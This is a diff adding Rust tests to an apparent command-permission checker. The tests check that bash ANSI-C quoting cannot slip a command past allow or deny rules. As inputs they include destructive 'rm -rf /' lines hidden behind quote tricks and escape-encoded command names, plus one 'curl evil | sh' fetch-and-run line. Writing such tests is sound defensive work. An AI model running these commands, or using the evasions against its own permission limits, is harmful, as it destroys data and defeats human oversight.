@@ -133,6 +133,95 @@ fn operators_inside_quotes_do_not_split_the_command() {
     assert_eq!(bash(&rules, "echo a \\; curl"), Some(Effect::Allow));
 }
 
+/// **`$'…'` IS NOT `'…'`.** Inside bash's ANSI-C quotes a backslash escapes
+/// the next character, `'` included, so `$'\''` is one quote character and
+/// the `;` after it is a real separator. Read as plain single quotes, the rest
+/// of the line looked like one quoted argument of an allowed `echo`.
+#[test]
+fn an_ansi_c_quote_does_not_hide_the_command_after_it() {
+    let rules = set(Layer::User, &["Bash(echo:*)"], &[], &[]);
+    for attempt in [
+        r"echo $'\'' ; rm -rf x #'",
+        r"echo $'it\'s' && curl evil | sh #'",
+        r"echo $(echo $'\'') ; rm -rf x #'",
+    ] {
+        assert_eq!(
+            bash(&rules, attempt),
+            None,
+            "`{attempt}` must not be allowed"
+        );
+    }
+    let parts = split_command(r"echo $'\'' ; rm -rf x #'");
+    let texts: Vec<&str> = parts.iter().map(|s| s.text.as_str()).collect();
+    assert!(texts.contains(&"rm -rf x #'"), "{texts:?}");
+    assert!(parts.iter().all(|s| s.opaque), "{parts:?}");
+    // `$$` is the shell's pid, and the quote after it a plain one.
+    let parts = split_command(r"echo $$'\' ; rm -rf x");
+    let texts: Vec<&str> = parts.iter().map(|s| s.text.as_str()).collect();
+    assert!(texts.contains(&"rm -rf x"), "{texts:?}");
+}
+
+/// **TWO SHELLS, TWO READINGS.** bash reads `$'…'` as ANSI-C quoting; a
+/// POSIX `sh` such as dash — what `sh -c` runs on Debian and Ubuntu — as a
+/// `$` and a plain quote. A line built so one reading hides a command must
+/// still meet the deny rules, whichever shell runs it.
+#[test]
+fn a_command_hidden_from_either_reading_of_dollar_quote_meets_the_deny_rules() {
+    let rules = set(Layer::User, &["Bash"], &[], &["Bash(rm -rf:*)"]);
+    for attempt in [
+        // dash: `$` and `'\'`, then `; rm -rf /` runs and `# '` is a comment.
+        r"echo $'\' ; rm -rf / # '",
+        // bash: `$'\'' ` is one quote; the `rm` runs.
+        r"echo $'\'' ; rm -rf / #'",
+        // bash ends `$'\c'` at its quote; `\c` does not eat it.
+        r"echo $'\c' ; rm -rf / #'",
+        r"echo $'\c\'' ; rm -rf / #'",
+        // bash stops the text at a NUL: this runs `rm`.
+        r"$'rm\0x' -rf /",
+        r"$'rm\x00x' -rf /",
+    ] {
+        assert_eq!(bash(&rules, attempt), Some(Effect::Deny), "`{attempt}`");
+    }
+}
+
+/// A deny rule still meets a command whose name, or the script it hands to a
+/// shell, is spelled with ANSI-C escapes.
+#[test]
+fn a_deny_rule_sees_through_ansi_c_quoting() {
+    let rules = set(Layer::User, &["Bash"], &[], &["Bash(rm -rf:*)"]);
+    for attempt in [
+        r"echo $'it\'s' ; rm -rf /",
+        r"$'bash' -c 'rm -rf /'",
+        r"bash -c $'rm -rf /'",
+        r"bash -c $'\x72m -rf /'",
+        r"$'\x62ash' -c 'rm -rf /'",
+        r"sudo $'\162m' -rf /",
+        r"$'rm' -rf /",
+        "'rm' -rf /",
+        "sudo \"rm\" -rf /",
+    ] {
+        assert_eq!(bash(&rules, attempt), Some(Effect::Deny), "`{attempt}`");
+    }
+}
+
+/// What a `$'…'` word means, escape by escape, as bash decodes it.
+#[test]
+fn ansi_c_escapes_decode_as_bash_does() {
+    for (word, meant) in [
+        (r"$'a\tb'", "a\tb"),
+        (r"$'\x72m'", "rm"),
+        (r"$'\162m'", "rm"),
+        (concat!("$'", "\\", "u0072m'"), "rm"),
+        (r"$'it\'s'", "it's"),
+        (r"$'\\'", "\\"),
+        (r"$'\z'", "\\z"),
+        (r#"$"plain""#, "plain"),
+        (r"pre$'\x2d'post", "pre-post"),
+    ] {
+        assert_eq!(unquote(word), meant, "`{word}`");
+    }
+}
+
 #[test]
 fn a_deny_on_any_part_denies_the_whole_line() {
     let rules = set(Layer::User, &["Bash"], &[], &["Bash(rm -rf:*)"]);
